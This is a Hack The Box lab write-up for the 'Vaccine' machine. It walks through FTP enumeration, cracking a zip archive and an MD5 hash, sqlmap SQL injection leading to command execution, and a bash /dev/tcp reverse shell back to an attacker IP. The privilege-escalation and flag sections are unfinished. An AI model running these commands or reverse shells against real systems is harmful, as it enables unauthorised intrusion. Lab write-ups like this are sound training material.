# HTB Writeup: Vaccine

**Difficulty:** Easy
**Target IP:** 10.129.77.138
**Platform:** Hack The Box

## Description

Vaccine is a very easy Linux machine that emphasizes enumeration and password cracking. Anonymous FTP access exposes a password-protected backup archive which can be cracked to recover web application credentials. These credentials grant access to a PHP application vulnerable to SQL injection, which leads to command execution and an initial shell as the `postgres` user. Privilege escalation is then achieved by abusing misconfigured sudo permissions on `vi`.

## 1. Reconnaissance

### Nmap

```bash
sudo nmap -sV -sC -T4 10.129.77.138
```

```
Nmap scan report for 10.129.77.138
Host is up (0.062s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.228
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Three open ports: **FTP (21)** with anonymous login allowed, **SSH (22)**, and **HTTP (80)** fronting a login page ("MegaCorp Login").

### FTP enumeration

Anonymous FTP login worked straight away:

```bash
ftp anonymous@10.129.77.138
```

`ls` revealed a single file, `backup.zip`. Pulled it down with `get`, then inspected it locally.

Attempting to unzip it prompted for a password — time to crack it.

### Further recon on the web app

```bash
curl -I 10.129.77.138
```

```
HTTP/1.1 200 OK
Date: Sat, 04 Jul 2026 18:52:04 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=k2m9sfmh3c9u9jaqpq8rtlvh88; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

PHP backend, session-cookie based auth, nothing unusual beyond the login page itself.

## 2. Exploitation

### Cracking backup.zip with John

First, convert the protected zip into a crackable hash format with `zip2john`:

```bash
zip2john backup.zip > ziphash.txt
```

Then run John against it with rockyou:

```bash
john --wordlist=rockyou.txt ziphash.txt
```

```
Loaded 1 password hash (PKZIP [32/64])
741852963        (backup.zip)
1g 0:00:00:00 DONE (2026-07-04 20:47) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
```

Zip password recovered: `741852963`.

```bash
unzip backup.zip
```

```
Archive:  backup.zip
[backup.zip] index.php password:
  inflating: index.php
  inflating: style.css
```

### Credentials in index.php

`index.php` contained the login check, including a hardcoded MD5 hash:

```php
if ($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

Saved the hash and cracked it with John as well:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > md5hash.txt
john --format=raw-md5 --wordlist=rockyou.txt md5hash.txt
```

Cracked password: `qwerty789`.

Logging in with `admin:qwerty789` on the web app's login page lands on a minimal admin dashboard. A `gobuster` sweep of the site didn't surface anything further — but the box description hints at SQL, so that became the next target.

### SQL injection via sqlmap

The dashboard has a `search` parameter. Since the app requires an authenticated session, the `PHPSESSID` cookie (grabbed from DevTools → Storage) has to be passed to sqlmap alongside the request:

```bash
sqlmap -u 'http://10.129.77.138/dashboard.php?search=any+query' --cookie=PHPSESSID=5gq5jjh8990jpmt2p0f891gp3q
```

```
GET parameter 'search' is vulnerable.
```

The `search` parameter is confirmed injectable.

### Getting a shell with --os-shell

```bash
sqlmap -u 'http://10.129.77.138/dashboard.php?search=any+query' --cookie=PHPSESSID=5gq5jjh8990jpmt2p0f891gp3q --os-shell
```

`sqlmap`'s `--os-shell` uses the injection to make the backend PostgreSQL instance execute OS commands directly on the server. The resulting shell works but is unstable, so it's worth upgrading to a proper reverse shell.

Start a listener on the attacker box:

```bash
sudo nc -lvnp 443
```

Then trigger a callback from the target through the sqlmap shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.228/443 0>&1"
```

This lands a stable reverse shell as `postgres`. From there, upgrade to a fully interactive TTY with the standard Python PTY trick (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) for a usable terminal.

## 3. Privilege Escalation

Per the box description, root is obtained by abusing a misconfigured `sudo` rule on `vi` (classic GTFOBins-style escape: `sudo -l` → spawn a shell from inside `vi`).

*(TODO: document the actual `sudo -l` output and the `vi` escape sequence used once re-verified.)*

## 4. Flags

*(TODO: add user.txt / root.txt values)*

## Key Takeaways

- **Anonymous FTP is still common and still worth checking first** — it directly handed over a credential-bearing artifact.
- **Cracked archives can contain more secrets than expected.** The zip password and the MD5 hash inside `index.php` each needed their own cracking pass.
- **Authenticated SQLi still needs the session cookie passed to your tooling** — sqlmap won't get past a login wall on its own.
- **`--os-shell` is convenient but unstable**; always plan to pivot to a proper reverse shell + PTY upgrade.
